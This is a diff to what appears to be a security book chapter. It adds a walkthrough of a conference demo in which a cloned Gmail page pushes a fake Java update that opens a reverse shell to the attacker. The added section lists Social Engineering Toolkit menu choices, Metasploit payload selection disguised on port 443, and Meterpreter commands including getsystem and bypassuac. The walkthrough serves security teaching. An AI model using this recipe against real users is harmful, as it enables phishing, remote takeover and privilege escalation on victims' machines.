@@ -97,6 +97,7 @@ An attacker can clone a legitimate website (with the likes of the Social Enginee
 
 The victim may visit the attackers cloned website due to ARP and/or DNS spoofing. Subterfuge is handy to run a plethora of attacks against the victims browser through the likes of the Metasploit Browser AutoPwn module. If >0 attacks are successful (we've managed to install a root-kit), the attacker will usually get a remote command shell to the victims system by way of reverse or bind shell. Then simply forward them onto the legitimate website without them even being aware of the attack.
 
+{#wdcnz-demo-3}
 ![](images/HandsOnHack.png)
 
 The following attack was one of five that I demonstrated at WDCNZ in 2015. The two leading up to this one provide some context and it's probably best to look at them first if you haven't already.
@@ -163,6 +164,102 @@ T> `/usr/share/beef-xss/extensions/social_engineering/web_cloner/interceptor.rb`
 T> and also modified to add new [config "hook"](http://sourceforge.net/p/piwat/WAT-Pentoo/ci/6402fce4c6966639927acb72c516edd203c41b77/tree/bin/beef/extensions/social_engineering/web_cloner/web_cloner.rb#l17),  
 T> also added to `/usr/share/beef-xss/config.yaml`.  
 T> Within the same config.yaml file `host` seems to serve two purposes. The address to access beef and where to fetch hook.js from. If I use an external address, beef only listens on the external interface (can't reach via loopback). So I added a `hook` config which is the address that the beef communications server is listening on that gets inserted into the cloned web page.
+
+
+
+
+
+
+{#wdcnz-demo-4}
+![](images/HandsOnHack.png)
+
+The following attack was the fourth one of five that I demonstrated at WDCNZ in 2015. The (previous demo)[#wdcnz-demo-3] will provide some additional context and it's probably best to look at it first if you haven't already.
+
+You can find the video of how it is played out [here](https://www.youtube.com/watch?v=tb4o5UCHzSA).
+
+I> ## Synopsis
+I>
+I> This demo differs from the previous in that the target will be presented with a Java "needs to be updated" popup. When the target plays along and executes what they think is an update, they are in fact starting a reverse shell to the attacker.  
+I> The website you choose to clone doesn't have to be one that the attacker spends much time on. All that's needed is for the attacker to have done their reconnaissance and know which web sites the target frequently visits. Clone one of them. Then wait for the target to fetch it. Then succumb to the attackers bait by clicking the "Update" or "Run this time" button.
+
+{icon=bomb}
+G> ## The Play
+G>
+G> Start postgresql:  
+G> `service postgresql start`  
+G> Start the Metasploit service:  
+G> `service metasploit start`  
+G> Start the Social Engineering Toolkit:  
+G> `setoolkit`   
+G>
+G> Choose:  
+G> `1) Social-Engineering Attacks`
+G>
+G> `2) Website Attack Vectors`
+G>
+G> `6) Multi-Attack Web Method`
+G>
+G> `2) Site Cloner`
+G>
+G> Don't need NAT/Port forwarding.
+G>
+G> Enter the IP address that Metasploit will be listening on. That's the IP address that you're launching the attack from.
+G>
+G> Enter `https://gmail.com` as the URL to clone.
+G>
+G> Turn on `1. Java Applet Attack Method` & `2. Metasploit Browser Exploit Method`.  
+G> Proceed with the attack.  
+G> The website is now cloned.  
+G>
+G> Select the vulns to exploit: `2) Meterpreter Multi-Memory Injection`.  
+G>
+G> Select the payloads to deliver. Select them all.  
+G> Confirm Port 443 to help disguise the reverse connection as legit.  
+G> The payloads are now encrypted and the reverse shells configured.  
+G>
+G> Take the easy option of `(2) Java Applet`
+G>
+G> Select `Metasploit Browser Autopwn` for the Java Applet browser exploit.  
+G> The cloned site is hosted -> msfconsole is started.
+G>
+G> Target fetches our spoofed gmail.  
+G> Oh… we have a Java update.  
+G> Now we know we’re always supposed to keep our systems patched right?  
+G> Better update.
+G>
+G> AV says we’re all safe. Must be all good.  
+G> A PowerShell exploit fails.  
+G>
+G> Here come the shells.  
+G> Interact with the first one:
+G> `sessions -i 1`
+G>
+G> Attempt to elevate privileges:  
+G> `getsystem`  
+G> Doesn't work on this shell.
+G>
+G> Let's list the available meterpreter extensions to make sure we have `priv`. 
+G> `use -l`  
+G> and priv is in the list.
+G> Now that we know we have priv, we can:
+G> `run bypassuac`  
+G> Now that's successful, but Anti-Virus detects bad signatures on some of the root-kits. On this shell I only got the privileges of the target running the browser exploit.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 ### Doppelganger Domains {#network-identify-risks-doppelganger-domains}
 
